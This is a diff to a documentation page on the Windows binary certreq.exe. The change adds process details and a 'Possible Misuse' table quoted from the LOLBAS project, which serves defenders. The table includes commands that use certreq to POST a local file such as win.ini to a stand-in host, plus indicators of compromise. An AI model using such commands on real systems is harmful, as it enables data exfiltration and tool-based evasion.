@@ -4,7 +4,7 @@ title: certreq.exe | CertReq.exe
 
 # certreq.exe 
 
-* File Path: `C:\windows\system32\certreq.exe`
+* File Path: `C:\Windows\system32\certreq.exe`
 * Description: CertReq.exe
 
 ## Screenshot
@@ -165,12 +165,39 @@ Usage:
     -attrib AttributeString
     -config URL
 
-Unknown argument: -help
+Unknown argument: --help
 
 ```
 
 ### Child Processes:
 conhost.exe
+
+### Window Title:
+Certificate Request Processor
+
+### Open Handles:
+
+Path | Type
+-- | --
+(R-D)   C:\Windows\Fonts\StaticCache.dat | File
+(R-D)   C:\Windows\System32\en-US\certreq.exe.mui | File
+(R-D)   C:\Windows\System32\en-US\KernelBase.dll.mui | File
+(RW-)   C:\Users\Administrator\Documents | File
+\BaseNamedObjects\NLS_CodePage_1252_3_2_0_0 | Section
+\BaseNamedObjects\NLS_CodePage_437_3_2_0_0 | Section
+\Sessions\2\Windows\Theme4283305886 | Section
+\Windows\Theme1956823608 | Section
+
+
+### Loaded Modules:
+
+Path |
+-- |
+C:\Windows\system32\certreq.exe |
+C:\Windows\System32\KERNEL32.DLL |
+C:\Windows\System32\KERNELBASE.dll |
+C:\Windows\SYSTEM32\ntdll.dll |
+
 
 ## Signature
 
@@ -191,6 +218,20 @@ conhost.exe
 * Legal Copyright:  Microsoft Corporation. All rights reserved.
 
 
+## Possible Misuse
+
+*The following table contains possible examples of `certreq.exe` being misused. While `certreq.exe` is **not** inherently malicious, its legitimate functionality can by abused for malicious purposes.*
+
+Source | Source File | Example | License
+-- | -- | -- | --
+[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `Name: CertReq.exe` | 
+[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `  - Command: CertReq -Post -config https://example.org/ c:\windows\win.ini output.txt` | 
+[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `  - Command: CertReq -Post -config https://example.org/ c:\windows\win.ini and show response in terminal` | 
+[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `  - Path: C:\Windows\System32\certreq.exe` | 
+[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `  - Path: C:\Windows\SysWOW64\certreq.exe` | 
+[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `  - IOC: certreq creates new files` | 
+[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `  - IOC: certreq makes POST requests` | 
+[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `  - Link: https://dtm.uk/certreq` | 
 
 
 
